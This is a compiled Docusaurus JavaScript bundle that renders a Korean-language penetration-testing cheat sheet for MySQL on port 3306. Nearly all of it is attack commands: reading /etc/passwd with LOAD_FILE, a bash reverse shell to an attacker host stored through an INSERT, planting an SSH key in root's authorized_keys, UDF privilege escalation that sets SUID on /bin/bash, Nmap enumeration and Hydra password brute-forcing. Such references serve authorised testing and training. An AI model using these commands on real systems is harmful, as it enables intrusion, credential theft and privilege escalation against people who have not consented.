"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[917],{5520:(s,e,n)=>{n.r(e),n.d(e,{assets:()=>t,contentTitle:()=>d,default:()=>o,frontMatter:()=>a,metadata:()=>l,toc:()=>c});const l=JSON.parse('{"id":"cheatsheet/services/mysql","title":"MySQL - 3306","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/cheatsheet/services/mysql.md","sourceDirName":"cheatsheet/services","slug":"/cheatsheet/services/mysql","permalink":"/my-docusaurus-page/cheatsheet/services/mysql","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":9,"frontMatter":{"sidebar_position":9},"sidebar":"tutorialSidebar","previous":{"title":"NFS - 2049","permalink":"/my-docusaurus-page/cheatsheet/services/nfs"},"next":{"title":"RDP - 3389","permalink":"/my-docusaurus-page/cheatsheet/services/rdp"}}');var r=n(4848),i=n(8453);const a={sidebar_position:9},d="MySQL - 3306",t={},c=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uc5f0\uacb0",id:"\uc5f0\uacb0",level:2},{value:"\uae30\ubcf8 \uba85\ub839\uc5b4",id:"\uae30\ubcf8-\uba85\ub839\uc5b4",level:2},{value:"\ud30c\uc77c \uc77d\uae30",id:"\ud30c\uc77c-\uc77d\uae30",level:2},{value:"\uc0ac\uc6a9\uc790 \ube44\ubc00\ubc88\ud638 \ubcc0\uacbd",id:"\uc0ac\uc6a9\uc790-\ube44\ubc00\ubc88\ud638-\ubcc0\uacbd",level:2},{value:"\uc258 \uc2e4\ud589",id:"\uc258-\uc2e4\ud589",level:2},{value:"\ucf54\ub4dc \uc0bd\uc785 \ubc0f \uc2e4\ud589",id:"\ucf54\ub4dc-\uc0bd\uc785-\ubc0f-\uc2e4\ud589",level:2},{value:"SSH Key \uc791\uc131",id:"ssh-key-\uc791\uc131",level:2},{value:"Nmap",id:"nmap",level:2},{value:"UDF (User Defined Function) \uad8c\ud55c \uc0c1\uc2b9",id:"udf-user-defined-function-\uad8c\ud55c-\uc0c1\uc2b9",level:2},{value:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4",id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function u(s){const e={code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...s.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.header,{children:(0,r.jsx)(e.h1,{id:"mysql---3306",children:"MySQL - 3306"})}),"\n",(0,r.jsx)(e.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ud3ec\ud2b8"}),": 3306"]}),"\n",(0,r.jsx)(e.p,{children:"MySQL\uc740 \uc624\ud508\uc18c\uc2a4 \uad00\uacc4\ud615 \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uad00\ub9ac \uc2dc\uc2a4\ud15c\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(e.h2,{id:"\uc5f0\uacb0",children:"\uc5f0\uacb0"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# \ub85c\uceec \uc5f0\uacb0\nmysql -u root -p\n\n# \uc6d0\uaca9 \uc5f0\uacb0\nmysql -u <USERNAME> -h <RHOST> -p\n\n# SSL \uc5c6\uc774 \uc5f0\uacb0\nmysql -u <USERNAME> -h <RHOST> -p --skip-ssl\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\uae30\ubcf8-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 \uba85\ub839\uc5b4"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- \uc0c1\ud0dc \ud655\uc778\nmysql> STATUS;\n\n-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ubaa9\ub85d\nmysql> SHOW databases;\n\n-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc120\ud0dd\nmysql> USE <DATABASE>;\n\n-- \ud14c\uc774\ube14 \ubaa9\ub85d\nmysql> SHOW tables;\n\n-- \ud14c\uc774\ube14 \uad6c\uc870 \ud655\uc778\nmysql> DESCRIBE <TABLE>;\n\n-- \ubc84\uc804 \ud655\uc778\nmysql> SELECT version();\n\n-- \ud604\uc7ac \uc0ac\uc6a9\uc790\nmysql> SELECT system_user();\n\n-- \ud14c\uc774\ube14 \ub0b4\uc6a9 \uc870\ud68c\nmysql> SELECT * FROM Users;\nmysql> SELECT * FROM users \\G;\nmysql> SELECT Username,Password FROM Users;\n\n-- \ud2b9\uc815 \uc0ac\uc6a9\uc790 \ube44\ubc00\ubc88\ud638 \ud655\uc778\nmysql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';\n\n-- \uad8c\ud55c \ud655\uc778\nmysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \\G;\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\ud30c\uc77c-\uc77d\uae30",children:"\ud30c\uc77c \uc77d\uae30"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- Linux \ud30c\uc77c \uc77d\uae30\nmysql> SELECT LOAD_FILE('/etc/passwd');\n\n-- Windows \ud30c\uc77c \uc77d\uae30\nmysql> SELECT LOAD_FILE('C:\\\\PATH\\\\TO\\\\FILE\\\\<FILE>');\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\uc0ac\uc6a9\uc790-\ube44\ubc00\ubc88\ud638-\ubcc0\uacbd",children:"\uc0ac\uc6a9\uc790 \ube44\ubc00\ubc88\ud638 \ubcc0\uacbd"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\uc258-\uc2e4\ud589",children:"\uc258 \uc2e4\ud589"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- \uc2dc\uc2a4\ud15c \uc258 \uc2e4\ud589\nmysql> \\! /bin/sh\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\ucf54\ub4dc-\uc0bd\uc785-\ubc0f-\uc2e4\ud589",children:"\ucf54\ub4dc \uc0bd\uc785 \ubc0f \uc2e4\ud589"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- \ub9ac\ubc84\uc2a4 \uc258 \uc0bd\uc785\nmysql> insert into users (id, email) values (<LPORT>, \"- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')\");\n"})}),"\n",(0,r.jsx)(e.h2,{id:"ssh-key-\uc791\uc131",children:"SSH Key \uc791\uc131"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- authorized_keys2\uc5d0 SSH \uacf5\uac1c\ud0a4 \uc791\uc131\nmysql> SELECT \"<SSH_PUBLIC_KEY>\" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\\n';\n"})}),"\n",(0,r.jsx)(e.h2,{id:"nmap",children:"Nmap"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# MySQL \ubc84\uc804 \ud655\uc778\nsudo nmap -p3306 -sV <RHOST>\n\n# MySQL \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p3306 --script mysql-info <RHOST>\n\n# MySQL \ube48 \ube44\ubc00\ubc88\ud638 \ud655\uc778\nsudo nmap -p3306 --script mysql-empty-password <RHOST>\n\n# MySQL \uc0ac\uc6a9\uc790 \uc5f4\uac70\nsudo nmap -p3306 --script mysql-users --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>\n\n# MySQL \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc5f4\uac70\nsudo nmap -p3306 --script mysql-databases --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>\n\n# MySQL \ubcc0\uc218 \ud655\uc778\nsudo nmap -p3306 --script mysql-variables --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>\n\n# MySQL \uac10\uc0ac\nsudo nmap -p3306 --script mysql-audit --script-args mysql-audit.username=<USERNAME>,mysql-audit.password=<PASSWORD> <RHOST>\n"})}),"\n",(0,r.jsx)(e.h2,{id:"udf-user-defined-function-\uad8c\ud55c-\uc0c1\uc2b9",children:"UDF (User Defined Function) \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-sql",children:"-- lib_mysqludf_sys\ub97c \uc774\uc6a9\ud55c \uba85\ub839 \uc2e4\ud589\n-- \uba3c\uc800 UDF \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c /usr/lib/mysql/plugin/\uc5d0 \uc5c5\ub85c\ub4dc\ud574\uc57c \ud568\n\nmysql> use mysql;\nmysql> create table foo(line blob);\nmysql> insert into foo values(load_file('/tmp/lib_mysqludf_sys.so'));\nmysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';\nmysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';\nmysql> select sys_exec('chmod +s /bin/bash');\n"})}),"\n",(0,r.jsx)(e.h2,{id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",children:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"# MySQL \ube0c\ub8e8\ud2b8\ud3ec\uc2a4\nhydra -L users.txt -P passwords.txt <RHOST> mysql\nhydra -l root -P passwords.txt <RHOST> mysql\n"})}),"\n",(0,r.jsx)(e.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"FILE \uad8c\ud55c \ud655\uc778 (LOAD_FILE, INTO OUTFILE \uc0ac\uc6a9 \uac00\ub2a5 \uc5ec\ubd80)"}),"\n",(0,r.jsx)(e.li,{children:"secure_file_priv \uc124\uc815 \ud655\uc778"}),"\n",(0,r.jsx)(e.li,{children:"root \uad8c\ud55c\uc73c\ub85c \uc2e4\ud589\ub418\ub294\uc9c0 \ud655\uc778"}),"\n",(0,r.jsx)(e.li,{children:"UDF\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589"}),"\n",(0,r.jsx)(e.li,{children:"\uc57d\ud55c \uc790\uaca9\uc99d\uba85 \ud14c\uc2a4\ud2b8"}),"\n"]})]})}function o(s={}){const{wrapper:e}={...(0,i.R)(),...s.components};return e?(0,r.jsx)(e,{...s,children:(0,r.jsx)(u,{...s})}):u(s)}},8453:(s,e,n)=>{n.d(e,{R:()=>a,x:()=>d});var l=n(6540);const r={},i=l.createContext(r);function a(s){const e=l.useContext(i);return l.useMemo(function(){return"function"==typeof s?s(e):{...e,...s}},[e,s])}function d(s){let e;return e=s.disableParentContext?"function"==typeof s.components?s.components(r):s.components||r:a(s.components),l.createElement(i.Provider,{value:e},s.children)}}}]);